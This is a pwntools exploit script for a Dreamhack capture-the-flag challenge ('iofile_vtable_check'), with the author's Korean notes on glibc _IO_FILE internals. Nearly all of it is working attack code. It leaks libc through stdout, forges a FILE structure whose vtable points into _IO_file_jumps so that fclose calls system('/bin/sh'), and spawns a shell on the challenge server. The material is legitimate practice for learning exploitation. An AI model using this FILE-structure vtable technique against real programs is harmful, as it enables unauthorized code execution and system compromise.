from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

이론...인데 수정하는 게 어려워 보인다.
도커 구성 하려 했지만 18.04라 크게 다른 건 없다고 생각해서 지금은 일단 이론 찾아보면서 만드는중

마지막에 fclose() 있으니까
JUMP_FIELD(_IO_finish_t, __finish); // fclose()
이거 쓰면 되지 않나?

아닌가.. 기억이 안난다.

대략적인 흐름은
fp에 페이로드 쓰는데, fp+0xe0에는 0이 들어가 있어야한다.
기억상 이쯤에는 딱히 필요한 값이 들어가진 않았던 것 같다.
구조체를 다시 봐야겠다.

struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
'''

elf = ELF("./iofile_vtable_check")
context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a): return success(': '.join([n, hex(a)]))

HOST, PORT = 'host8.dreamhack.games 18782'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    p = process('./iofile_vtable_check', env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1].strip(), 16)
print(hex(stdout))

lb = stdout - libc.sym["_IO_2_1_stdout_"]
system = lb + libc.sym["system"]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
fp = elf.sym['fp']
vtable = lb + libc.sym['_IO_file_jumps']+0xc0

slog("stdout offset", libc.sym["_IO_2_1_stdout_"])
slog("libc_base", lb)
slog("system", system)
slog("vtable(str jumps)", vtable)

# gdb.attach(p)
# pause()

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(binsh) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock 
payload += p64(0x0)*9
payload += p64(vtable) # io_file_jump overwrite 
payload += p64(0)
payload += p64(system) 
# gdb.attach(p)
# pause()
p.sendafter(b'Data: ', payload)

p.interactive()